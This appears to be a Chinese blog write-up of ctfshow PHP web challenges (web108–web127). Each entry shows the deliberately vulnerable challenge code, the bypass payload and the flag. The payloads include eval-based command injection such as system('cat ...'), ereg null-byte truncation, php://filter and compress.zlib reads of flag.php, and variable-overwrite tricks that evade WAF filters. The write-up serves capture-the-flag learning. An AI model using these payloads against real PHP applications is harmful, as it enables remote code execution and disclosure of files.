<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p>
<p>就是说，我前面随便写字母，在数字之前用%00会结束ereg继续往下读取</p>
<p>strrev()函数会颠倒字符串：123变成321</p>
<p>?c=aawedagiufuiafg%00778</p>
<p>ctfshow{e59c653b-ab46-4ab8-8616-5981adf48b4a}</p>
<h1>web109</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?v1=Exception&amp;v2=system(‘cat fl36dg.txt’)</p>
<p>或者</p>
<p>?v1=ReflectionClass&amp;v2=system(‘ls’)<br>
?v1=ReflectionClass&amp;v2=system(‘cat f*’)</p>
<p>ctfshow{f1026488-7b30-4870-b70a-1591bf8c5984}</p>
<h1>web110</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>FilesystemIterator获取目录文件<a href="http://phpff.com/filesystemiterator">FilesystemIterator</a><br>
getcwd()函数取得当前工作目录<a href="https://blog.csdn.net/baidu_35085676/article/details/52002579">getcwd()函数</a></p>
<p>?v1=FilesystemIterator&amp;v2=getcwd</p>
<p>直接访问fl36dga.txt</p>
<p>ctfshow{877b1427-8494-4b02-83da-50395cfd5c76}</p>
<h1>web111</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$GLOBALS — 引用全局作用域中可用的全部变量，var_dump可以输出数组<br>
一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<p>ctfshow{eb655091-d6da-49ac-9cb2-720ddfd96409}</p>
<h1>web112</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</p>
<p>?file=php://filter/resource=flag.php</p>
<p>?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</p>
<p>?file=compress.zlib://flag.php</p>
<p>ctfshow{d02647e2-a740-41a6-9655-e216a80a09f6}</p>
<h1>web113</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?file=compress.zlib://flag.php</p>
<p>ctfshow{fc4adad6-e67a-4a2f-acc6-182981fd2038}</p>
<h1>web114</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>?file=php://filter/resource=flag.php</p>
<p>ctfshow{d99300ad-d9f6-42a3-b591-dcb9fdb4c81c}</p>
<h1>web115</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编写程序查看哪些东西可以用</p>
<p>首先是is_numeric()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>)==<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再看trim+is_numeric</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这是自己测试的过程</p>
<p>通常下面的url编码不会被过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格：%20</span><br><span class="line">换行符：%0a</span><br><span class="line">制表符：%09</span><br><span class="line">回车符：%0d</span><br><span class="line">垂直制表符：%0b</span><br></pre></td></tr></table></figure>
<p>?num=%0c36</p>
<p>ctfshow{d868739b-d912-4a86-b673-7350f9de5640}</p>
<h1>web123</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了。<a href="https://developer.aliyun.com/article/1585258?spm=a2c6h.12873639.article-detail.9.734c76b6RS9rI3">https://developer.aliyun.com/article/1585258?spm=a2c6h.12873639.article-detail.9.734c76b6RS9rI3</a></p>
<p>这里CTF[SHOW.COM=&gt;CTF_SHOW.COM</p>
<p>要求CTF_SHOW、CTF_SHOW.COM必须传参，fl0g不能传参。所以$fl0g===&quot;flag_give_me&quot;条件不能满足，可以利用上面的eval。</p>
<p>psot=CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag</p>
<p>ctfshow{c1a29324-df3e-4f88-aaaa-07fca79f4668}</p>
<p>题中有一段代码是a=a=_SERVER[‘argv’];</p>
<p>pear文件包含，argv这个东西涉及到了pear文件包含的原理。</p>
<p>具体请点击上文的链接，接下来是个人理解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">argv能够独立获取传入?=巴拉巴拉...的作用</span><br><span class="line">$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]这个就是获取传入?的</span><br><span class="line">$_SERVER[‘argv’][0]就是a[0]</span><br><span class="line"></span><br><span class="line">那么我们在上面的方法当中没有传入fl0g=flag_give_me</span><br><span class="line">那么我们在这里可以传入$fl0g=flag_give_me，在post里面使用SERVER[′argv′][0](也就是a[0])就可以绕过isset(fl0g)</span><br><span class="line"></span><br><span class="line">payload:注意这里传入的不是fl0g，而是带$的fl0g，通过eval调用$a[0]。eval函数用不了可以使用asset代替</span><br><span class="line">get:</span><br><span class="line">?$fl0g=flag_give_me;</span><br><span class="line">post:</span><br><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])</span><br><span class="line"></span><br><span class="line">另外一个payload，利用parse_str()函数，不使用eval，但是这种方法需要bp发包:</span><br><span class="line">$query = &quot;name=John&amp;age=30&amp;city=New York&quot;;</span><br><span class="line">parse_str($query, $output);</span><br><span class="line"></span><br><span class="line">payload:这里我方便理解，就写的和作者一样了，根据个人能力可以联想一下，修改。+是空格</span><br><span class="line">get:</span><br><span class="line">?a=1=1+fl0g=flag_give_me</span><br><span class="line">post:</span><br><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>
<h1>web125</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=extract($_POST)&amp;fl0g=flag_give_me</p>
<p>对post进行覆盖，让$fl0g=flag_give_me，以便if($fl0g===“flag_give_me”)可以正常识别到fl0g</p>
<p>或者我们使用上面的办法</p>
<p>get:</p>
<p>?$fl0g=flag_give_me;</p>
<p>post:</p>
<p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])</p>
<p>再或者</p>
<p>?a=flag.php</p>
<p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=highlight_file($_GET[a])</p>
<p>ctfshow{0605866c-3720-4957-ac25-0e9ff5cc71bd}</p>
<h1>web126</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>get:</p>
<p>?$fl0g=flag_give_me;</p>
<p>psot:</p>
<p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])</p>
<p>ctfshow{b6aceaa0-bba5-4f52-adce-3439b1a660f1}</p>
<h1>web127</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们要传入?ctf_show=ilove36d</p>
<p>但是被waf函数过滤了下划线</p>
<p>但我们在之前知道：在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了。</p>
<p>那么我们需要绕过对下划线的过滤，而waf当中是没有过滤空格的，所以</p>
<p>?ctf show=ilove36d</p>
